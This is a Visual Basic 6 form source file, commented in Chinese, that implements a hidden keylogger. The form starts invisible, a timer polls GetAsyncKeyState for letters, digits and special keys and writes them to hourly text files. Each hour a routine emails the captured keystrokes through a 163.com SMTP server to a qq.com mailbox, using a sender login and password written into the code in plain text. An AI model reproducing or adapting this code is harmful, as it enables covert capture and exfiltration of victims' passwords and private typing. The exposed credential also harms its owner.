VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3030
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   4560
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3030
   ScaleWidth      =   4560
   StartUpPosition =   3  '窗口缺省
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   240
      Top             =   1320
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Start"
      Height          =   615
      Left            =   1200
      TabIndex        =   0
      Top             =   1320
      Width           =   1935
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal key As Long) As Long

Dim txt As String, t As Integer, d As String

Private Function dt() As Long
For i = 1 To Len(Date)
If Asc(Mid(Date, i, 1)) >= 48 And Asc(Mid(Date, i, 1)) <= 57 Then dt = dt & Mid(Date, i, 1)
Next i
End Function

Private Sub msg()
Open txt For Input As #1
Do
Input #1, keystate
s = s & Space(1) & keystate
Loop Until EOF(1)
Close #1
Dim Email As Object
Const NameSpace = "http://schemas.microsoft.com/cdo/configuration/"
Set Email = CreateObject("cdo.message")
Email.From = "13015621507@163.com"  '发件人邮箱
Email.to = "1290541225@qq.com"  '收件人邮箱
Email.Subject = "keystate" '主题
Email.Textbody = s '邮件内容
'Email.AddAttachment '附件，输入绝对路径，如d:\1.jpg
With Email.Configuration.Fields
.Item(NameSpace & "sendusing") = 2
.Item(NameSpace & "smtpserver") = "smtp.163.com" '使用163的邮件服务器
.Item(NameSpace & "smtpserverport") = 25
.Item(NameSpace & "smtpauthenticate") = 1
.Item(NameSpace & "sendusername") = "13015621507" '163号码
.Item(NameSpace & "sendpassword") = "yy12138" ' 密码
.Update
End With
Email.Send

End Sub

Private Sub wrt(word As String)
If Dir(txt) = "" Then
Open txt For Output As #1
Print #1, word
Close #1
Else
Open txt For Append As #1
Print #1, word
Close #1
End If
End Sub

Private Sub Command1_Click()
Form1.Visible = False
MsgBox "Press 'F1' to stop", , "Watcher"
Timer1.Enabled = True
End Sub

Private Sub Form_Load()
d = dt()
t = Mid(Time, 1, 2)
txt = d & t & ".txt"
Timer1.Enabled = True
End Sub

Private Sub Timer1_Timer()
If GetAsyncKeyState(vbKeyF1) Then Timer1.Enabled = False: Form1.Visible = True
If Not dt() = d Then '日期
d = dt(): msg: txt = d & t & ".txt"
Else
If Not Mid(Time, 1, 2) = t Then '时间
t = Mid(Time, 1, 2): msg: txt = d & t & ".txt"
End If
End If
If GetAsyncKeyState(vbKeyTab) Then wrt "Tab"
If GetAsyncKeyState(vbKeyCapital) Then wrt "CapsLock"
If GetAsyncKeyState(vbKeyShift) Or GetAsyncKeyState(160) Then wrt "Shift"
If GetAsyncKeyState(vbKeyBack) Then wrt "Bksp"
If GetAsyncKeyState(vbKeyControl) Or GetAsyncKeyState(162) Then wrt "Ctrl"
If GetAsyncKeyState(vbKeyMenu) Or GetAsyncKeyState(164) Then wrt "Alt"
If GetAsyncKeyState(13) Then wrt "Enter"
If GetAsyncKeyState(vbKeyEscape) Then wrt "Esc"
If GetAsyncKeyState(vbKeyAdd) Then wrt "+"
If GetAsyncKeyState(192) Then wrt "`"
If GetAsyncKeyState(189) Then wrt "-"
If GetAsyncKeyState(187) Then wrt "="
If GetAsyncKeyState(vbKeyHome) Then wrt "Home"
If GetAsyncKeyState(vbKeyPageUp) Then wrt "PgUp"
If GetAsyncKeyState(vbKeyPageDown) Then wrt "PgDn"
If GetAsyncKeyState(111) Then wrt "/"
If GetAsyncKeyState(219) Then wrt "["
If GetAsyncKeyState(221) Then wrt "]"
If GetAsyncKeyState(220) Then wrt "\"
If GetAsyncKeyState(vbKeyDelete) Then wrt "Del"
If GetAsyncKeyState(vbKeyEnd) Then wrt "End"
If GetAsyncKeyState(106) Then wrt "*"
If GetAsyncKeyState(186) Then wrt ";"
If GetAsyncKeyState(222) Then wrt "'"
If GetAsyncKeyState(vbKeyInsert) Then wrt "Insert"
If GetAsyncKeyState(vbKeyPause) Then wrt "Pause"
If GetAsyncKeyState(109) Then wrt "-"
If GetAsyncKeyState(188) Then wrt ","
If GetAsyncKeyState(190) Or GetAsyncKeyState(110) Then wrt "."
If GetAsyncKeyState(191) Then wrt "/"
If GetAsyncKeyState(vbKeyUp) Then wrt "Up"
If GetAsyncKeyState(vbKeyDown) Then wrt "Down"
If GetAsyncKeyState(vbKeyLeft) Then wrt "Left"
If GetAsyncKeyState(vbKeyRight) Then wrt "Right"
If GetAsyncKeyState(vbKeyPrint) Then wrt "PrtScn"
If GetAsyncKeyState(vbKeyScrollLock) Then wrt "ScrLock"
If GetAsyncKeyState(vbKeySpace) Then wrt " "
If GetAsyncKeyState(vbKeyNumlock) Then wrt "NumLock"
If GetAsyncKeyState(vbKeyHelp) Then wrt "Help"
For i = 65 To 90 ' a to z
If GetAsyncKeyState(i) Then wrt Chr(i + 32)
Next i
For i = 48 To 57 ' 0 to 9
If GetAsyncKeyState(i) Or GetAsyncKeyState(i + 48) Then wrt Chr(i)
Next i
End Sub
